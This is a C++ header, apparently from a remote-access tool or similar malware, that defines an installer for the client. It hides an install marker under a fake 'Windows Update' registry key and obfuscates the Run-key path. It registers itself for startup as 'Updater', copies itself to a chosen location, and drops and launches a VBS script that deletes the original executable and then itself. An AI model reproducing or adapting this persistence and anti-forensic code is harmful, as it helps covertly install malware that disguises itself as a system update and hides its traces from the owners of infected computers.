#pragma once

class Installer
{
private:
	RegUtils ru;

public:
	bool IsInstalled()
	{
		string buffer;

		ru.ReadStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", "Install State", buffer);

		return (buffer == "true");
	}

	short InstallClient()
	{
		Settaggi sett;
		SystemUtils su;
		DirUtils du;

		string RemVBS = "";

		if (!sett.InstallSettings())
			return 1;

		string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;

		if (PathToCopy.find("<User>") != string::npos)
			PathToCopy = StringUtils::PlaceHolder(PathToCopy, "<User>", su.GetCurrentUser());

		ru.DeleteValue(ru.CurrentUser, (string)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater");

		if (sett.RegStartup)
			if (!ru.WriteStringValue(ru.CurrentUser, (string)AY_OBFUSCATE("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), "Updater", "\"" + PathToCopy + "\""))
				return 2;

		if (StringUtils::ToLowerCase(du.GetFullModuleFilePath()) != StringUtils::ToLowerCase(PathToCopy))
		{
			debug.log.Info(PathToCopy + " <- " + du.GetFullModuleFilePath());

			du.DelFile(PathToCopy);
			if (!du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy))
				return 3;

			RemVBS += "WScript.Sleep 1000\n";
			RemVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
			RemVBS += "filesys.DeleteFile \"" + du.GetFullModuleFilePath() + "\"\n";
			RemVBS += "filesys.DeleteFile \"" + du.GetModuleFilePath() + "Rem.vbs\"";

			du.WriteFile(du.GetModuleFilePath() + "Rem.vbs", RemVBS);

			if (debug.DeleteOriginalExe)
				su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Rem.vbs\"");
		}

		if (!ru.WriteStringValue(ru.CurrentUser, "SOFTWARE\\Windows Update", "Install State", "true"))
			return 4;

		su.RunExe(PathToCopy);

		return 0;
	}

};